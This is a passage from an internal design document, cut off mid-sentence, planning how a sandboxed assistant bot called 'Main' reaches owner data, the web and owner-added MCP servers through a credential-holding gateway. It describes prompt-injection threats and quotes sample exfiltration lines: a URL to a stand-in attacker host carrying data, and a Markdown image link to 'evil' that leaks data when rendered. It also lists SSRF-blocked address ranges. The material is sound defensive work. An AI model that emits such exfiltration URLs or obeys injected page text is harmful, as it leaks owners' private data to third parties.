# What Main can reach: TinyCloud MCP, the web, owner-added MCP servers

Details: TC-2808 (follow-on to [`tiny-bots-slice1.md`](tiny-bots-slice1.md)). Design only: nothing here is built. Research on other egress approaches: the [egress research report](https://linear.app/tinycloud-labs/document/main-bot-egress-research-reportmd-72c8fa544670), attached to TC-2808.

## Goal

Today Main can only talk to its model. It cannot read the owner's data, search the web, read a page or use any tool,
which makes it a chat box. This plan gives it three capabilities, each opt-in per owner, built in this order:

1. the owner's own TinyCloud data, read only, through the hosted MCP (`https://mcp.tinycloud.xyz/mcp`);
2. web search and page reading, done by the search vendor through the gateway;
3. remote MCP servers the owner adds themselves.

All three follow the same rules: the sandbox never holds a credential and never has a network, the gateway holds
every credential and makes every outside call, the owner sees and controls each one, each has budgets, the audit log
holds counts and never content, and the owner can turn each off at any time. For TinyCloud data, turning it off ends
Main's use of the access, not the delegation underneath, until decision 2 (section 2).

## Today

- The sandbox runs under gVisor with `--network=none`. Its only way out is its own Unix socket, bridged to
  `127.0.0.1:8080` inside the sandbox (`bots/sandbox/bot-start.sh`).
- `bots-gateway` accepts only `POST /v1/chat/completions` and `GET /v1/models` on that socket, with the bot's own token,
  and forwards to the fixed origin `https://tee.redpill.ai` with the model key it alone holds (`bots/README.md`).
  A bot is registered with the gateway over its admin socket (`PUT /bots/<botId>`); registrations do not survive a
  gateway restart.
- OMP in the sandbox has no MCP server configured.
- Hosted MCP facts this design relies on (js-sdk `packages/mcp` and OpenKey `docs/resource-server-token-status.md`):
  - An OAuth access token for `https://mcp.tinycloud.xyz/mcp` lasts 12 hours (OpenKey #417, TC-1366); refresh tokens
    last 7 days; a connection ends at the 30-day sign-in cap. The scope is `tinycloud:mcp`.
  - The MCP checks every token with OpenKey's token-status endpoint and reuses an active answer for 30 s. If OpenKey
    cannot answer, it serves a token only if OpenKey called it active within the last 60 s. A revoked token, a withdrawn
    consent or an ended sign-in is `active: false`.
  - The token identifies the owner. Authority over data is separate: each operation needs a TinyCloud delegation the
    owner approved through OpenKey. When it is missing the tool answers `authority_required` with a short-lived approval
    link. Production requests 30-day delegations and 15-minute links (`TC_MCP_DELEGATION_EXPIRY=30d`).
  - A delegation cannot be revoked early: the MCP has no revoke route for them (TC-1156). Tokens can be revoked;
    delegations end at their expiry.
  - The owner sees and disconnects connected MCP apps on the OpenKey account page, and sees the MCP's delegation on
    `account.tinycloud.xyz/delegations`.
  - The MCP logs only the tool name, a result code, the duration and a replay count.
  - The TinyChat backend already reaches the MCP for meeting transcripts with an owner-signed, read-only grant to a
    service identity (`MCP_CHAT_*`, `backend/src/mcp-meetings`; the MCP's `/native/grant`, js-sdk `packages/mcp` read at
    `ae3b37c4`, 2026-10-29, to be confirmed against the deployed MCP). It is a separate path from OAuth: the MCP keeps
    that grant in a tenant of its own keyed by the owner DID, calls carry a service credential and an owner-DID header,
    and the MCP refuses any request that carries an `Origin` header. Today it accepts exactly one grant shape (the
    connectors database and prefix, read only, at most 30 days), exposes only `tinycloud_sql_query` and
    `tinycloud_kv_get` to it, has one service identity and one credential, holds one grant per owner (a later grant
    that would end earlier is refused) and has no route to revoke a grant.

## Design

### 1. The gateway is Main's one MCP server

The gateway gains one route on each bot's socket, `POST /v1/mcp`. To the sandbox it is a single MCP server (OMP's MCP
client is pointed at `http://127.0.0.1:8080/v1/mcp`; the config key is confirmed at build). Behind it the gateway
serves the tools of whatever the owner has enabled: the hosted TinyCloud MCP (sections 2 to 4), its own web tools
(Web access, below) and the owner's added servers. Tool names are namespaced (`tinycloud__kv_get`, `web__fetch`,
`<server slug>__<tool>`) so a server cannot shadow another's tool. The sandbox never names a host. The model routes,
the one-request-per-bot slot, the 4 MiB body cap and the response cap apply to this route too.

The gateway reads the JSON-RPC request and rebuilds it, as it does for chat bodies. It passes only `initialize`,
`notifications/initialized`, `ping`, `tools/list` and `tools/call`. Everything else (resources, prompts, sampling,
elicitation, roots) is answered locally with a fixed error and never sent. `tools/call` is passed only for a tool on the
bot's allowlist; `tools/list` answers are rebuilt from that list. The gateway owns every upstream MCP session id and
`Authorization` or credential header; the sandbox sees neither. The only hosts the gateway ever calls for a bot are: the
model origin, `mcp.tinycloud.xyz` (phase 1), the search vendor's API host (phase 2), and the owner's servers (phase 3,
through the outbound hop in the Egress section).

`GET` (the SSE stream) and `DELETE` on `/v1/mcp` are refused (405), so the sandbox cannot open a server-to-client stream
or end a session. The gateway strips `Mcp-Session-Id` from every reply.

### 2. Who holds the grant

**Recommended: the native-grant pattern the backend already uses for transcripts** (facts under Today). The owner's
browser signs a narrow, expiring delegation to a service identity, as Main's history grant already does
(`frontend/src/bots/historyGrant.ts`). The backend checks it and hands it to the MCP once, and the MCP holds it. The
gateway holds no OAuth token, refresh token or delegation: it holds a service credential and sends the owner's DID.

- **Approval.** The owner picks what Main may read and for how long; their browser signs the delegation (space,
  prefixes or databases, read actions, expiry). The backend runs the checks `validateSignedMcpGrant` runs today: the
  delegate is Main's service DID, the delegator is the signed-in user (the owner DID comes from the authenticated
  session, never a request body), the expiry is within the ceiling, and nothing is granted beyond the permitted read
  permissions. It posts the delegation to `/native/grant` with the service credential, and the MCP derives the owner
  from the signed grant itself.
- **Which screen signs, and the cross-app rule.** TinyChat's own session holds only TinyChat's own prefix. Main's
  history grant works because it first checks `hasPermissions` for that prefix: `delegateTo` would otherwise try a
  runtime permission escalation (`frontend/src/bots/historyGrant.ts`, in its own comment). Main reading another app's
  data is cross-app and beyond what the session holds, so the owner must first approve extra authority at OpenKey's
  approval screen (the escalation prompt, in the popup or embedded flow); TinyChat then signs the narrowed delegation
  to Main's service DID. **This is a requirement, not a copy claim: that screen shows the cross-app warning with
  "Reject this permission", and no cross-app grant is offered until it does.** Until then the picker offers only
  TinyChat's own prefix, where no OpenKey screen appears. The `/delegate` link flows are not that screen (they show
  neither). Which OpenKey flow shows it, and how TinyChat's session obtains the extra authority, are OpenKey's to
  confirm (decision 1).
- **Calls and the owner binding.** The gateway sends the service credential and an owner DID. The backend derives the
  DID from the authenticated session address (`botOwnerDid` in `backend/src/routes/bots.ts`; the request body and
  headers never choose it) and sends it to the supervisor with the service secret, and the supervisor keys the bot by
  `botIdFor(ownerDid)`, the hash of the DID. Registration (`PUT /bots/<botId>` carries only the token today) gains that
  DID, and: the gateway refuses a registration whose DID does not hash to the bot id; the DID is fixed for as long as
  the bot is registered, and a different DID for a registered bot is an error, not an update; the sandbox and the chat
  can never supply or change it, and any identity header the sandbox sends is dropped. The MCP trusts the DID the
  gateway sends, so this mapping is the isolation between owners. One bot per owner exists today (the bot id is a
  function of the DID alone), so one grant per owner covers it; if an owner ever has several bots, a grant carries the
  bot id or each bot gets its own service identity, never a silent share. The credential is a gateway secret in its
  environment, like the model key; the sandbox, the supervisor's saved state and the bot state never hold it. There is
  no code exchange, `state`, refresh token or token file in this path, so the login-CSRF and mix-up risks of an OAuth
  exchange do not arise; what stands in their place is the backend's check that the delegator is the signed-in user.
- **Windows.** The expiry is signed into the delegation, so the node refuses it afterwards. "Just for this task" is a
  delegation that expires in 1 hour at most, and the gateway also stops using it when Main's turn settles. "For 7
  days" is a 7-day delegation, offered only after a warning screen, with no silent renewal: a renewal is a new
  signature by the owner. No default, no nudge.
- **Revoke.** There is no route to revoke a native grant. Disconnect ends Main's use of it (the gateway marks the bot's
  grant ended and refuses before calling the MCP); the delegation itself ends at its signed expiry. That is why the
  windows are short, and the copy says when it ends.
- **Risks, stated plainly.**
  - *A stolen gateway credential* reads every live Main grant of every owner registered on that gateway, until each
    ends (up to 7 days), because a native grant cannot be withdrawn early. Rotating the credential at the MCP should
    cut the thief off at once (confirm at build); the grants themselves stay until they expire. That is why Main gets
    its own service identity and credential (precondition 2), why the default window is 1 hour, and why "For 7 days"
    sits behind a warning.
  - *"For 7 days" does not renew.* This plan makes it a 7-day delegation that ends, and a renewal is a new owner
    signature. That is stricter than the earlier rule of "7 days, renewing, behind a warning", and it costs the owner
    a re-sign each week. Which one ships is a product decision (decision 3).

**Precondition (decision 2): the MCP does not do this for Main yet, and nothing below ships until it does.**
1. *Shape and tools.* The MCP accepts exactly the connectors permissions and exposes two tools to a native identity.
   Main needs a ceiling that lets the owner pick spaces, prefixes and databases (read only) and the read tools in
   section 3.
2. *Its own identity and tenant.* The MCP has one service identity, one credential and one grant per owner. If Main
   used them, (a) its grant would collide with the transcript grant (a different or shorter grant is refused), (b) Main
   could use what the transcript grant covers, and (c) the gateway's credential would reach every owner who has
   granted the backend. Main needs its own service DID, credential and tenant namespace, so that compromising the
   gateway reaches only grants made to Main.
3. *Shorter windows.* A later grant that would end earlier than the stored one is refused today; a 1-hour grant after a
   7-day one needs an explicit replace rule.

**Why not OAuth** (the fallback, and why it was set aside): the hosted `/mcp` OAuth route keys tenants by the OpenKey
subject alone, so Main would use any delegation the owner approved for another MCP client, and what Main's flow
approves would become usable by those clients. It holds 30-day delegations that cannot be revoked early (TC-1156), so
a 1-hour or 7-day window would be token-only. Its approval goes through OpenKey's `/delegate` link flows, which show
no extra warning or "Reject this permission" (the #538 security review confirmed that ticket and link flows skip both).
And it puts an access token and a refresh token in the gateway, which needs the code exchange bound to the user and
the bot. Those bindings are written down in phase 3, because owner-added servers use them.

### 3. Limits, budgets, audit, revoke, what the owner sees

**Tools.** Phase 1 is read-only. The allowlist is the hosted tools whose only effect is `read`, minus the ones that mint
authority or return secrets:

- exposed: `tinycloud_kv_get`, `tinycloud_kv_head`, `tinycloud_kv_list`, `tinycloud_sql_query`,
  `tinycloud_sql_schema_inspect`, `tinycloud_read`, `tinycloud_knowledge_list`, `tinycloud_knowledge_read`,
  `tinycloud_apps_read`, `tinycloud_account_spaces_list`, `tinycloud_status`;
- not exposed, ever: `tinycloud_auth_request`, `tinycloud_auth_read_scope`, `tinycloud_connect`, `tinycloud_secrets_get`
  (secrets stay on their own short-lived policy);
- not exposed in phase 1 (writes, or reads with a side effect): `tinycloud_kv_put`, `tinycloud_kv_delete`,
  `tinycloud_sql_execute`, `tinycloud_apps_write`, `tinycloud_apps_query`, `tinycloud_apps_context`,
  `tinycloud_account_applications_list`. A write phase needs its own plan and its own approval copy.

The delegation is the real limit, **once decision 2 is built**: the owner picks the space and prefixes or databases
when signing it, and the node refuses anything outside them. The gateway's list is a second layer, not the first.
Today a native identity sees two tools and one fixed shape, so none of this exists yet. Build confirms that
`tinycloud_sql_query` is held read-only by the node's delegation (a read-only database permission) and not only by the
tool's name.

**Budgets** (starting values, tuned after the first run): per task, 30 tool calls and 256 KiB of results; per bot per
day, 500 calls; one call in flight per bot; 20 s per call; results already capped by the MCP at 100,000 characters.
Results enter the model's context, so they also count against the existing per-bot and global token budgets.

**Audit.** The gateway logs counts, never content: per bot (hashed id) and day, calls by tool name and outcome
(`ok`, `tool_not_permitted`, `grant_ended`, `grant_refused`, `mcp_unavailable`, `budget`), bytes returned. No
arguments, no results, no credential. The owner sees the same counts in Main's settings.

**Revoke.** Disconnect in Main's settings tells the backend, which tells the supervisor, which has the gateway mark the
bot's grant ended; the gateway checks that on every call, so the next call is refused before it reaches the MCP. The
delegation underneath is not ended by this: there is no route to revoke a native grant, so it stays in the MCP until
its signed expiry (1 hour or 7 days). Disconnect ends Main's use of it, not its existence, and the copy says when it
ends. A shorter signed expiry is the only early end.

**What the owner sees** (copy for review; every string lives in the bots strings module):

| Where | Draft |
| --- | --- |
| Main's settings, off | "TinyCloud data" / "Main can't read your TinyCloud data." / button "Let Main read it" |
| Choice sheet | **Held until decision 2 is built** (the windows are not yet true): "Let Main read your TinyCloud data?" / "Main can read what you pick, nothing else. It can't change anything. What it reads is sent to the AI model service to write its answer." / options "Just for this task" (selected), "For 7 days" / "You pick what Main can read" (app list, none selected) |
| After "For 7 days" | **Held until decision 2 is built:** warning screen: "Keep Main's access for 7 days?" / "Main will keep reading what you picked until you turn it off or 7 days pass. It will not renew on its own." / "Keep it to this task" / "Allow 7 days" |
| Approval | For the extra authority a cross-app grant needs: OpenKey's approval screen, which **must** show the cross-app warning with "Reject this permission" (held until it exists; no cross-app grant is offered before). For TinyChat's own prefix: the signing step in the browser, with no OpenKey screen |
| Active | **Held until decision 2 is built:** "Main can read <apps> until <time>." / "Used 12 times today." / button "Disconnect". After Disconnect: "Main has stopped. The permission itself ends <time>." |
| Ended | "Main's access to your TinyCloud data has ended." / "Give Main access again" |

Copy goes to Monica before any of it ships. It makes no claim about encryption or about what Main may do later.

### 4. Failure modes

Each answers the model with a fixed one-line error (no upstream text) and logs a count.

| Case | What happens |
| --- | --- |
| Grant expired, revoked or gateway restarted | `grant_ended`. The model is told access ended. The supervisor sends the owner a `grant_needed` event; the "Ended" line shows. No retry loop. |
| MCP down, 5xx, timeout, or `native_grant_validation_unavailable` (503) | `mcp_unavailable`. No retry of the call. After 3 in a row the gateway refuses for 60 s. The turn goes on without the data. |
| Tool not on the allowlist | Refused locally, `tool_not_permitted`; never sent. |
| The node refuses a call outside the grant (Main asked for more than the owner signed) | The model gets a fixed one-line error; counted as `grant_refused`. The owner gets "Main asked for something you didn't allow: <what>" with a "Change access" button that opens TinyChat's own signing sheet. `<what>` is built by the gateway from structured fields (tool name, space, prefix or database), never from model text or the node's message, so injected text in data Main read cannot word the request. Nothing is widened automatically. |
| 401 `native_grant_required`, `native_grant_expired` or `native_grant_rejected` | Treated as the grant ending, as the first row. |
| Over a per-task or per-day budget, or a second call in flight | Refused, `budget`, with the body unread. |
| Oversize or malformed response | Dropped; `mcp_unavailable`. |

## Web access (phase 2)

The gateway offers two tools, `search` and `fetch`, as an MCP server named `web` (OMP shows them as `mcp__web_search` and `mcp__web_fetch`). **As built (Sam chose "our gateway fetches pages", option 1):** a search is
Tavily Search and gets the query and fixed flags only. A page is read by our own key-less `bots-fetch` container, which the gateway
asks for one checked address; it applies the dial guard below on every hop. The gateway itself dials only the vendor's API host
and `bots-fetch`, never an address a page or the model named. A page's own server sees the bots server's address and a fixed
`User-Agent`, never the owner. The sandbox has no raw network and gets no new route beyond `/v1/mcp`.

**Provider.** Tavily, which the backend already pays for. Checked in the code: the backend reads `TAVILY_API_KEY` from
its environment (`docker-compose.phala.yml`, `backend/src/mcp-meetings/config.ts`) and calls only
`POST https://api.tavily.com/search` with the key in the JSON body, `max_results: 5`, `include_answer: true` and
`search_depth: "basic"` (`backend/src/mcp-meetings/web-search.ts`). So this plan adds no provider and no account. As built the provider is used for Search only (Extract is not
called, so its plan coverage no longer matters). One thing is not what the backend does today and is not assumed: bots run in their own compose project, so "the existing key"
means the same secret held a second time in the bots gateway's environment, and chat web search and Main would draw on
one provider budget. A separate key under the same account, if Tavily offers one, keeps budgets and rotation apart;
that is the only open choice (decision 4). Brave, Exa, Kagi or a self-hosted SearXNG are alternatives, not proposals.
Only the search query goes to the vendor (no site list, no page address, no page text, no user data); the owner copy says so.

**Checks before a call.**
- `web__fetch` takes one URL: scheme `https` or `http` only; no user info; ports 80 and 443 only; no IP literal and no
  single-label or `localhost` name; at most 2,048 characters. These checks keep nonsense out; they do not resolve names.
  SSRF into our network is closed by the dial guard in `bots-fetch` (below), which resolves every name and refuses any
  non-public answer.
- While the conversation is marked as holding owner data, the URL must have come from a search result in this
  conversation or from the owner (the exfil rule, below).
- Time: 20 s per read (the reader's own deadline; the gateway allows 25 s). Size: 1 MiB of body (cut, not held), the text
  cut at 40,000 characters for the model; text types only (HTML, XHTML, plain text); PDFs and pages that need JavaScript
  are not read, and the model is told so in one sentence. The result is wrapped as untrusted content (below).
- Fetching does not stop exfiltration: `https://attacker.example/?d=<data>` still delivers the data to the attacker. Only the
  known-address rule and the exfil rule do that.

**As built: the page reader (`bots/src/fetch-guard.ts`, `fetch-service.ts`, `fetch-main.ts`, `page-text.ts`).** One extra container
in the bots compose, same image, unprivileged, read-only, no capabilities, no key, no volume. It is on `fetch-link` (an
internal network shared only with the gateway) and `fetch-out` (its own way to the internet); it shares no network with the
supervisor, the sandboxes' sockets or the ingress. `POST /fetch {url, hosts}` (`hosts`: the owner's list, or null for any
public site). The guard resolves the name itself and refuses it if any answer is not a public address (private, loopback,
link-local and the cloud-metadata address, CGNAT, multicast, reserved, and the IPv6 forms that embed IPv4: mapped, NAT64,
6to4, Teredo); connects to a checked address, never the name again (so a rebinding resolver gains nothing); verifies TLS
against the name; re-checks every redirect (3 at most) and the owner's list; sends no cookie, referer or credential; and
bounds headers, body, time and concurrency. HTML becomes plain text there: scripts and styles go, an image becomes its
alt text, a link becomes `text (address)` so a page-offered address can be read next. The gateway re-checks the address
the reader ended on against the list, strips anything that could draw, cuts and wraps. Tests: every blocked range, a name
with one internal answer, a redirect into a blocked range or off the list, a changed second answer, an oversize body, a
silent and a trickling server, a malformed response.

**Dial guard** (phase 3, and any direct fetch added later). Every request the gateway makes to a host the owner or a page named, and every redirect hop, goes through one guard. It is its own module with its own tests, built before phase 3:
- Scheme `https` or `http` only; no user info in the URL; ports 80 and 443 only; no non-HTTP schemes of any kind.
- The host is resolved by the gateway and **every** address returned is checked; the connection is then made to the
  address that was checked (not resolved again), with the original host in SNI and `Host`. That closes DNS rebinding
  only if nothing in between resolves the name again: the fetcher ignores `HTTP_PROXY`, `HTTPS_PROXY` and `NO_PROXY`
  from its environment, uses only the one outer ring this plan configures explicitly (if any), and otherwise talks to
  the target directly. A proxy placed behind the gateway would resolve the name itself and reopen
  rebinding, unless its own dial-time deny list carries the same list as below.
- Refused addresses: loopback, unspecified, private (RFC 1918), shared/CGNAT, link-local (including the cloud metadata
  address `169.254.169.254`), multicast, broadcast, reserved, IPv6 loopback/ULA/link-local, and these forms, named
  explicitly because they embed or tunnel IPv4 addresses: IPv4-mapped `::ffff:0:0/96`, IPv4-compatible `::a.b.c.d`
  (`::/96`), NAT64 `64:ff9b::/96` and the local-use `64:ff9b:1::/48`, 6to4 `2002::/16`, Teredo `2001::/32` and
  site-local `fec0::/10`. IP literals in decimal, octal or hex form are normalised before the check. Names that
  resolve into the gateway's own compose network are refused by the same rule.
- At most 3 redirects, each re-checked from the start (scheme, host, address); a redirect to a refused target ends the
  fetch.
- No cookies, no request body taken from the sandbox, a fixed `User-Agent`. Time and size caps are per call type (an
  owner-added server: 10 s to connect, 20 s per call, 256 KiB per result).

**Budgets** (as built): per bot per day, 100 searches and 300 page reads; all bots together 2,000 and 6,000 a day; one web
call in flight per bot. There is no per-task cap: the gateway has no notion of a task, so the plan's earlier 10 and 20
per task are not built. The global cap can be used up by many accounts (about 20 bots at the per-bot cap); while bots are
limited to an allowlist of accounts that is bounded, and opening them wider needs a fairer split first. Returned text also
counts against the token budgets.

**Audit and owner view.** Counts by tool and outcome (`ok`, `blocked_url`, `blocked_by_rule`, `too_large`,
`provider_error`, `timeout`, `budget`), bytes returned. No query, no URL, no page text. The settings row shows "Main
searched 4 times and read 9 pages today." Blocked attempts are counted separately so a spike is visible.

**Owner control (as built, tinychat web-access PR).** Web access is a per-owner setting, off by default, with three
presets, the same shape as the large assistants' domain controls (Claude's allowed domains, ChatGPT's per-site
allow list):
- **Off** (default). Every call is refused at the gateway and counted as blocked.
- **Only sites I list.** Up to 50 site names, subdomains included. The gateway refuses any other site even if the bot asks
  for it directly. A search is not sent the list: the provider gets the query only, and the results are filtered to the
  list here. A page is read by `bots-fetch`, which is given the list and applies it to every redirect.
- **Any public site.** Search the web and read any public page, with a stronger warning.

Turning on either preset shows the prompt-injection warning first, and so does moving from the list to any site. The
setting is saved by the supervisor outside the sandbox and given to the gateway; the gateway applies it on every call, so
a change takes effect at the bot's next call, and a gateway restart without a fresh push reads as off. It carries no owner
credential and no owner data, so it has no expiry. In both on-presets a page is read only if its address was typed by the
owner (the supervisor hands the gateway addresses from the owner's own message, never the sandbox's) or returned by an
earlier search or page. The conversation mark (decision 5) is separate and not part of this build: Main has no owner-data
tools yet. Residual risk, stated to the owner: a search query (at most 200 characters), a choice among the addresses a page offered
(about 285 bytes a day per bot at the caps), a link the owner is asked to paste or open, and what Main keeps in its own
state can carry data out; and anyone who can post on a listed site can still try an injection. The owner's list refuses
shared places (`github.io`, `pages.dev`, `co.uk`, ...) because listing one covers every tenant. The page reader is sent exactly
the checked address without its fragment, and the address it reports ending on is checked again against the list. This is why the
list preset is the safer one.

**Note.** The conversation mark in the exfil rule below still applies to the web and MCP tool rules; only the image prompt no longer depends on it.

**Untrusted text.** Everything that comes back from the web (and from an owner-added server, below) is data, not
instructions, and the design does not rely on the model to tell the difference:
- The gateway wraps it as quoted content with a fixed label and gives it no authority; a page cannot add a tool, widen a
  grant, change an allowlist or raise a budget, because those live in the gateway and the owner's settings, not in the
  conversation.
- Grant-bearing tools (TinyCloud data, an owner's server) are still gated by their allowlist, scope, budget and
  expiry. Writes are not exposed in phase 1; a later write phase confirms each write with the owner outside the model.
- **The exfil rule: the largest risk in phase 2, and one no proxy can remove.** Once Main can read owner data and also
  fetch the open web or call an owner-added server, injected text in a page or a tool result can make it read data and
  then request `https://attacker.example/?d=<data>`, or put the data in an owner-added server's tool arguments (the same
  channel, to a third party). A search query is the same channel. An allowlist cannot stop this while fetch is
  open-ended. **The rule is about the conversation, not the task:** owner data stays in Main's context after the task
  that read it ends, so a later task with no grant-bearing call still holds it. The gateway therefore marks a bot's
  conversation as holding owner data from the first grant-bearing result, and clears the mark only when the supervisor
  tells it the conversation was reset with a fresh context (the gateway cannot see what a summary kept, so a summary
  does not clear it). The order does not matter: if web content arrived first and a private read follows, the read sets
  the mark and the rule applies from then on. While marked, exactly one of these rules applies, chosen in decision 5, to
  `web__fetch`, `web__search` and every owner-added server's tools:
  - **(a) Strict. Recommended.** For the rest of the conversation, `web__search`, `web__fetch` and every owner-added
    server call are all refused. Nothing leaves. That includes web search: a query is the same channel as a fetch, so
    once a conversation holds owner data Main has no web search at all (it works again only in a conversation with a
    fresh context).
  - **(b) Narrowed.** `web__search` still works, with the query capped at 200 characters and shown in the
    owner's activity view. `web__fetch` accepts only a URL that a search in this conversation returned or that the
    owner typed (the gateway records both; the supervisor hands it URLs from the owner's messages). Owner-added server
    calls are refused. This narrows the channel and does not close it: a query or a choice among results can still
    carry a few words.
  - **(c) Owner confirms** (outside the model) each new domain before the first fetch to it, and each owner-added
    server before its first call, while marked. A loosening to consider after (a), alongside (b).

  Under any of the three, an outbound write is never automatic: a TinyCloud write, an owner-added server tool the
  owner has not marked read-only, or anything that sends data to a third party needs the owner's approval outside the
  model, every time, and is never auto-approved. (Writes are not exposed in phase 1.)
- **Replies are an exfil channel too, and no egress layer sees them.** A reply that contains `![](https://evil/?d=<data>)`
  leaks the data the moment a renderer loads the image, with no click. What TinyChat's renderers do today (read, not
  run):
  - *Main* (`frontend/src/bots/MainChat.tsx`): a reply is shown as plain text in a `<p>` with `whitespace-pre-wrap`.
    No Markdown, no images, no links, no auto-linking. Closed now.
  - *The general chat* (`chat/Thread.tsx`, through `components/assistant-ui/markdown-text.tsx`): `MarkdownTextPrimitive`
    with `remark-gfm`, overriding only code blocks. A Markdown image renders as an `<img>` and loads from any host as
    the reply streams in; GFM turns bare URLs into links and renders `[label](https://host)` with a label that can say
    anything. The desktop app's CSP allows `img-src https:` (`desktop/src-tauri/tauri.conf.json`, noted there as "chat
    markdown and avatars"), so it would not stop this, and no CSP for the web build was found in this repo. That chat
    already reads meeting transcripts and does web search, so **this path is open today in the existing chat, not only
    a future Main risk**; its fix is a separate change (tinychat#757, which supersedes #745) and does not wait for phase 2.
  - *Feed posts* render agent-authored media (`PostPage.tsx` `media.src`, option and page images; avatars in
    `FeedView.tsx`) as remote images by design; article text is plain. That is an agent-to-feed channel, not model
    prose, and outside this plan, but an agent that can read owner data and also post is the same shape of channel.

  The rule:
  1. Image addresses are filtered on every surface that draws model text (chat reply, notes), whatever the conversation holds. An
     address that does not look like it carries data loads as it always did, within a budget: per reply or note, at most 2
     different images from hosts outside a short allowlist (our own hosts and two named image hosts) load silently, and the
     rest wait behind one prompt for the whole reply. An address that does look like it carries data asks first in the
     renderer: "Load image from <host>?" with the full address, "Load" and "Not now"; no `src` exists until Load, and Load
     allows that one address. Signals: a query string over 64 characters or more than 8 parameters, a path segment over 64 or a
     path over 160, a base64 run of 40 or more or more than 8 percent escapes, 8 or more different words across path and query,
     `user:password@`, `http:`, an IP address as host, a host with more than one label above its domain or a long or
     mixed-alphanumeric label, or an address inside the address (`url=`, `mark=`, redirects). While a chat reply streams no
     image outside the allowlist loads; the silent two are chosen from the finished text. `data:`, `blob:` and other non-web
     addresses never load. The filter keeps no per-site or trust state and judges the address only, so a short payload in a
     normal-looking address still loads; the accepted ceiling is about 1.3 kbit per image and 2.7 kbit per reply or note (the
     security review's measurement). It does not need the conversation mark.
  2. Links in model text send no referrer and no opener (`rel="noopener noreferrer nofollow"`, `referrerPolicy="no-referrer"`).
     They are not rewritten and the renderer does not open them.
  3. A second layer that does not trust the first: while marked, the layer that sees the final reply text strips
     Markdown image syntax and HTML tags from it.

  Rules 1 and 2 ship for the general chat and notes on their own schedule (tinychat#757), and for Main no later than phase 2
  (or before Main's replies move to Markdown, whichever is first); Main's renderer reuses `imageUrlVerdict`. Main's replies
  are plain text today, so no image loads there. Web pages Main reads never carry an image address into a reply either: the
  gateway turns images into their alt text before the model sees the page.

## Owner-added MCP servers (phase 3)

The owner can add a remote MCP server (streamable HTTP) so Main can use its tools. Everything about a server is held
and enforced by the gateway.

**Adding one.** Settings, "Tools Main can use", "Add a tool server". The owner enters an `https` URL (no `http`, no
user info, port 443 only). The gateway, not the backend or the browser, contacts it, through the dial guard and the
outbound hop (Egress section): resolve, check every address, connect to the checked address, no redirects on MCP
calls, 10 s total. It runs
`initialize` and `tools/list` and returns what the owner needs to decide: the host, the server's own name, and its
tools by name and description.

Writes stay off. A tool counts as read-only only if the owner marks it so when choosing tools (the server's own hints
are shown, never trusted), and every call to any other tool needs the owner's approval each time (the exfil rule).

**What the owner approves, per server:**
1. the server (its host is shown exactly as it will be contacted);
2. which of its tools Main may use. None is selected by default. The server's read-only hints are shown as hints and
   never trusted;
3. how long: "Just for this task" (up to 1 hour) or "For 7 days", with the same warning screen before 7 days as for
   TinyCloud data, and no silent renewal.

**Credential.** If the server supports the MCP authorization flow (OAuth with PKCE), the owner signs in at the server's
authorization server in their browser and the gateway does the code exchange. The flow is bound to the person and the
bot:
- PKCE is required, and `state` is a single-use value the backend stores server-side with a short life, tied to the
  signed-in TinyChat user and the `botId`. The callback is rejected if `state` is missing, reused, expired, or does not
  match that user and bot.
- The backend passes the code and the PKCE verifier to the supervisor over the existing service-authenticated call, and
  the supervisor hands them to the gateway over its admin socket. The token is first seen inside the gateway; the
  backend and supervisor never see, log or store it.

The server itself names its authorization server during discovery, so a malicious server could name a real one
(GitHub, Google), the owner would approve at a screen they trust, and the gateway would then hand that token to the
malicious server. So:
- The add screen shows the authorization server's host next to the server's, and requires an explicit confirmation
  when they are different sites ("This server asks you to sign in at <host>").
- The authorization request carries the RFC 8707 `resource` parameter set to the server's exact URL, and the gateway
  attaches a token only to the resource it was issued for, never to another server or path. That gateway-side rule is
  the real control: RFC 8707 only helps where the server or its authorization server honours it.

If it takes a bearer key instead, the owner pastes it once into a field that posts it to the supervisor and on to the
gateway; the browser, backend and supervisor do not keep it, and request-body logging is off for that route in the
backend and the supervisor. The gateway holds a token or key in memory for one task and, for 7 days, in a file on its
own volume, encrypted (AES-GCM, key from the gateway's environment like the model key), mode 0600; Remove deletes the
file. The token endpoint and every URL the gateway fetches for the flow go through the dial guard.

**Per-server tool allowlist and pinning.** Tools are exposed as `<slug>__<tool>`. The gateway hashes each approved
tool's name, description and input schema at approval. If the server later changes one, that tool is withheld until the
owner approves the change. Descriptions are truncated to 500 characters, schemas must be plain JSON Schema within a size
cap, and both are treated as untrusted text. A server can't add a tool to the allowlist by announcing it.

**Budgets** (starting values): at most 5 servers per owner; per server per task 20 calls and 256 KiB of results; per
server per day 300 calls; one call in flight per server; 20 s per call.

**Audit and owner view.** Counts per server, tool and outcome (`ok`, `tool_not_permitted`, `grant_ended`,
`server_changed`, `blocked_address`, `server_unavailable`, `budget`). No arguments, results, tokens or URLs. Settings
list each server with its tools, expiry and "Used 6 times today", and a "Remove" button.

**Remove and revoke.** Remove deletes the credential in the gateway, closes the upstream session (`DELETE` with the
session id), calls the server's revocation endpoint if it advertises one, and the next call is refused. A server that
does not honour revocation keeps a token that only the gateway held, until it expires.

**Failures.** The same fixed one-line errors as section 4: server unreachable or slow (no retry; 3 in a row pause the
server for 60 s), token expired (owner sees "<server> access has ended" with "Add it again"), refused address,
tool changed, over budget.

### Owner copy for review (Monica)

| Where | Draft |
| --- | --- |
| Web, off | "Web" / "Main can't search the web or read pages." / "Let Main use the web" |
| Web, choice | "Web access" / "Off" / "Only sites I list" / "Any public site", then "Let Main use the web?" / "A web page can hide instructions meant for an AI. Main may follow them, and could put what you've told it into a search or a web address. Searches and page addresses go to our search provider." / "Turn on" / "Not now" (final wording: copy review on the web-access PR) |
| Web, on | "Main can use the web." / "Searched 4 times and read 9 pages today." / "Turn off" |
| Add server | "Add a tool server" / "Paste the address of an MCP server you trust." / "Main can use the tools you allow, nothing else." |
| Server tools | "<name> (<host>)" / "Choose what Main may use" (none ticked) |
| Server, 7 days | "Keep <name> connected for 7 days?" / "Main keeps using the tools you picked until you remove it or 7 days pass." / "Keep it to this task" / "Allow 7 days" |
| Server, active | "<name> can be used until <time>." / "Used 6 times today." / "Remove" |
| Server, ended | "<name> access has ended." / "Add it again" |

## Egress layer: iron-proxy and the alternatives

**Decision (the result of this section).** Keep `--network=none` and the per-bot socket: the Bun gateway is the single
policy point and every capability is a gateway route. iron-proxy is **not** adopted now. Phases 1 and 2 need no outbound
hop: phase 1 dials one fixed host and phase 2 dials only the search vendor's API host. For phase 3, owner-added
